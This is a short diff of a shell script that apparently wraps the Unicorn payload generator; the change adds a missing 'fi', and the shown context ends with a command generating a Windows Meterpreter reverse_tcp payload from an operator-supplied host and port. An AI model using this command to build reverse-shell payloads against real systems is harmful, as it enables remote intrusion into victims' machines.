@@ -96,6 +96,7 @@ elif [ "$select" = "2" ]; then
   echo ""
   echo "Please enter port for reverse connection"
   echo -ne ">"; read lport
+fi
 
 echo "Generating Payload..."
 python unicorn/unicorn.py windows/meterpreter/reverse_tcp $lhost $lport
